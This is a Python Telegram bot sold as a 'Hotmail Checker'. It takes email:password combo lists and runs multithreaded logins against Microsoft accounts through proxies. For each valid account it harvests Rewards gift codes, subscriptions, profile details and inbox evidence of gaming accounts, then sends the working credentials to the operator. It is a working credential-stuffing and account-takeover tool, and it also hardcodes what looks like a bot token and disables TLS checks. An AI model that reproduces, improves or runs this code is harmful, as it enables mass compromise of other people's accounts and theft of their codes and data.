#!/usr/bin/env python3
"""Hotmail Checker Bot - Ultra High Performance Flux Version"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Config
BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID = 5944410248
DB = "checker.db"

# Flux flow global
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

# Global proxy list and thread-safe db
PROXIES = []
db_lock = threading.Lock()

class Database:
    def __init__(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0)''')
                c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')
                c.execute("PRAGMA table_info(results)")
                if 'details' not in [col[1] for col in c.fetchall()]:
                    c.execute("ALTER TABLE results ADD COLUMN details TEXT")
                conn.commit()
            finally:
                conn.close()
    
    def add_user(self, uid, uname, fname):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
                c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
                conn.commit()
            finally:
                conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def is_banned(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r[0] if r else 0
            finally:
                conn.close()

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def save_result(self, uid, email, status, details):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
                if status == 'hit':
                    c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
                else:
                    c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def get_user_settings(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
                r = c.fetchone()
                if r:
                    return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
                return {'keywords': [], 'threads': 5}
            finally:
                conn.close()

    def update_settings(self, uid, keywords=None, threads=None):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                if keywords is not None:
                    c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
                if threads is not None:
                    c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
                conn.commit()
            finally:
                conn.close()

    def get_stats(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT COUNT(*) FROM users')
                t = c.fetchone()[0]
                c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
                a = c.fetchone()[0]
                c.execute('SELECT SUM(total_checks) FROM users')
                ch = c.fetchone()[0] or 0
                c.execute('SELECT SUM(total_hits) FROM users')
                h = c.fetchone()[0] or 0
                return {'total': t, 'active': a, 'checks': ch, 'hits': h}
            finally:
                conn.close()

    def user_stats(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return {'checks': r[0], 'hits': r[1], 'credits': r[2]} if r else {'checks': 0, 'hits': 0, 'credits': 0}
            finally:
                conn.close()

class Checker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

    def get_login_params(self):
        attempts = 0
        while attempts < 3:
            try:
                r = self.session.get(sFTTag_url, headers=self.headers, timeout=5)
                text = r.text
                ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
                url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
                if ppft and url_post:
                    return url_post.group(1).replace('&amp;', '&'), ppft.group(1)
            except: pass
            attempts += 1
            time.sleep(0.05)
        return None, None

    def login(self, email, password):
        urlPost, sFTTag = self.get_login_params()
        if not urlPost or not sFTTag: return None

        attempts = 0
        while attempts < 3:
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                r = self.session.post(urlPost, data=data, headers=self.headers, allow_redirects=True, timeout=8)

                if '#' in r.url and r.url != sFTTag_url:
                    token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if token: return token

                elif 'cancel?mkt=' in r.text:
                    ipt = re.search(r'name="ipt" value="(.+?)"', r.text)
                    pprid = re.search(r'name="pprid" value="(.+?)"', r.text)
                    uaid = re.search(r'name="uaid" value="(.+?)"', r.text)
                    action = re.search(r'id="fmHF" action="(.+?)"', r.text)
                    if ipt and pprid and uaid and action:
                        d = {'ipt': ipt.group(1), 'pprid': pprid.group(1), 'uaid': uaid.group(1)}
                        ret = self.session.post(action.group(1), data=d, timeout=8)
                        r_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                        if r_url:
                            fin = self.session.get(r_url.group(1).replace('\\u0026', '&'), timeout=8)
                            token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                            if token: return token
                    return '2FA'

                elif any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt']):
                    return '2FA'

                elif any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account']):
                    return 'BAD'
            except: pass
            attempts += 1
            time.sleep(0.05)
        return None

    def capture_full(self, token, email, keywords=[]):
        cap = {'pts': 0, 'codes': [], 'subs': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'sc': 'No', 'tk': 'No', 'name': 'N/A', 'country': 'N/A', 'keys': []}
        try:
            # Rewards
            try:
                r = self.session.get("https://rewards.bing.com/", timeout=5)
                m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
                if m: cap['pts'] = int(m.group(1))

                if cap['pts'] > 0:
                    url = 'https://rewards.bing.com/redeem/orderhistory'
                    r = self.session.get(url, timeout=5)
                    if 'fmHF' in r.text:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        form = soup.find('form', id='fmHF')
                        if form:
                            d = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                            a = form.get('action', '')
                            if a.startswith('/'): a = 'https://login.live.com' + a
                            self.session.post(a, data=d, timeout=5)
                            r = self.session.get(url, timeout=5)

                    text = BeautifulSoup(r.text, 'html.parser').get_text()
                    patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
                    for p in patterns:
                        found = re.findall(p, text)
                        for c in found:
                            if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']):
                                cap['codes'].append(c)
            except: pass

            # Profile
            cid = self.session.cookies.get("MSPCID", "").upper()
            h = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
            try:
                r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=5)
                if r.status_code == 200:
                    p = r.json()
                    cap['name'] = p.get('displayName', 'N/A')
                    loc = p.get('location', {})
                    if isinstance(loc, dict):
                        cap['country'] = loc.get('country', loc.get('countryOrRegion', 'N/A'))
                    else: cap['country'] = str(loc)
            except: pass

            # Subscriptions
            try:
                state = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
                url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state)}&prompt=none"
                r = self.session.get(url, headers={"Referer": "https://account.microsoft.com/"}, timeout=8)
                p_token = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
                if p_token:
                    ph = {"Authorization": f'MSADELEGATE1.0="{unquote(p_token.group(1))}"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
                    r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=ph, timeout=5)
                    if r_sub.status_code == 200:
                        kws = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive', 'EA Play': 'EA Play'}
                        for kw, n in kws.items():
                            if kw in r_sub.text: cap['subs'].append(n)
            except: pass

            # Inbox Search
            queries = {'psn': "sony@txn-email.playstation.com", 'steam': "noreply@steampowered.com", 'sc': "noreply@id.supercell.com", 'tk': "account.tiktok"}
            for key, q in queries.items():
                payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
                if r.status_code == 200:
                    try:
                        if r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0: cap[key] = "Yes"
                    except: pass

            # Minecraft
            try:
                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=5)
                if r.status_code == 200: cap['mc'] = f"Yes ({r.json().get('name')})"
            except: pass

            # Custom Keywords
            if keywords:
                for kw in keywords:
                    payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
                    if r.status_code == 200:
                        try:
                            t = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                            if t > 0: cap['keys'].append(f"{kw}({t})")
                        except: pass
        except: pass
        return cap

    def check(self, email, password, keywords=[]):
        res = {'email': email, 'status': 'bad', 'cap': {}}
        token = self.login(email, password)
        if not token: return res
        if token == '2FA':
            res['status'] = '2fa'
            return res
        res['status'] = 'hit'
        res['cap'] = self.capture_full(token, email, keywords)
        return res

db = Database()

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid): return
    welcome = f"🚀 **Ultra High CPM Hotmail Checker**\n\nOptimized Threading Engine (Target: 200+ CPM)\nProxies: `{len(PROXIES)}` loaded."
    kb = [[InlineKeyboardButton("🔍 Start Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
          [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
    else: await u.message.reply_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not db.has_access(u.effective_user.id): return
    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8')
        global PROXIES
        PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid): return
    text = (await (await c.bot.get_file(u.message.document.file_id)).download_as_bytearray()).decode('utf-8') if u.message.document else u.message.text
    lines = [l.strip() for l in text.split('\n') if ':' in l]
    if not lines: return

    settings = db.get_user_settings(uid)
    max_threads = min(settings['threads'] if PROXIES else 5, 300)

    status_msg = await u.message.reply_text("🔄 **Starting ultra-high CPM engine...**", parse_mode='Markdown')
    hits, bad, tfa, checked = 0, 0, 0, 0
    start_time = time.time()
    results_file = f"hits_{uid}.txt"
    update_lock = asyncio.Lock()
    last_hits, last_update = [], 0

    def run_check(line):
        try:
            e, p = line.split(':', 1)
            e, p = e.strip(), p.strip()
            checker = Checker(random.choice(PROXIES) if PROXIES else None)
            res = checker.check(e, p, settings['keywords'])
            return {'e': e, 'p': p, 'res': res}
        except: return None

    loop = asyncio.get_running_loop()
    semaphore = asyncio.Semaphore(max_threads)

    async def sem_worker(line):
        nonlocal hits, bad, tfa, checked, last_update
        async with semaphore:
            data = await loop.run_in_executor(executor, run_check, line)
            if not data: return

            email, pwd, res = data['e'], data['p'], data['res']
            checked += 1
            db.save_result(uid, email, res['status'], res)

            if res['status'] == 'hit':
                hits += 1
                c_data = res['cap']
                cap_str = f"Name: {c_data['name']} | Country: {c_data['country']} | Points: {c_data['pts']} | "
                cap_str += ", ".join([f"{k}:{v}" for k,v in c_data.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
                if c_data['subs']: cap_str += f" | Subs: {', '.join(c_data['subs'])}"
                if c_data['keys']: cap_str += f" | Keys: {', '.join(c_data['keys'])}"

                hit_text = f"🎯 **HIT**\n📧 `{email}`\n🔑 `{pwd}`\n💰 Pts: `{c_data['pts']}` | 🎁 Codes: `{len(c_data['codes'])}`"
                if cap_str: hit_text += f"\n🎮 Cap: `{cap_str}`"

                last_hits.append(f"✅ {email}")
                if len(last_hits) > 5: last_hits.pop(0)

                try: await c.bot.send_message(uid, hit_text, parse_mode='Markdown')
                except: pass
                with open(results_file, 'a') as f: f.write(f"{email}:{pwd} | Pts:{c_data['pts']} | Cap:{cap_str} | Codes:{c_data['codes']}\n")
            elif res['status'] == '2fa': tfa += 1
            else: bad += 1

            async with update_lock:
                now = time.time()
                if now - last_update > 2 or checked == len(lines):
                    last_update = now
                    elapsed = now - start_time
                    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
                    prg = (f"🔄 **Live Capture Screen**\n\n"
                           f"📊 Progress: `{checked}/{len(lines)}`\n"
                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
                           f"🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n"
                           f"🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
                    except: pass

    # Execute checks concurrently without blocking the event loop
    await asyncio.gather(*(sem_worker(l) for l in lines))

    if os.path.exists(results_file):
        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Complete!** Hits: `{hits}`", parse_mode='Markdown')
        os.remove(results_file)
    else: await u.message.reply_text("✅ **Check Complete!** No hits.", parse_mode='Markdown')

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    uid = q.from_user.id
    await q.answer()
    if q.data == "settings":
        s = db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nCommands: `/threads 1-250`, `/keywords word1,word2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "stats":
        s = db.user_stats(uid)
        await q.edit_message_text(f"📊 **Statistics for {'Admin' if uid == ADMIN_ID else u.effective_user.first_name}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "admin":
        if uid == ADMIN_ID:
            s = db.get_stats()
            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "back": await start(u, c)

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    try:
        t = int(c.args[0])
        if 1 <= t <= 250: db.update_settings(u.effective_user.id, threads=t); await u.message.reply_text(f"✅ Threads: `{t}`")
    except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args: kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]; db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(re.compile(r'prox', re.I)), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), handle_combo))
    app.run_polling()

if __name__ == '__main__':
    main()
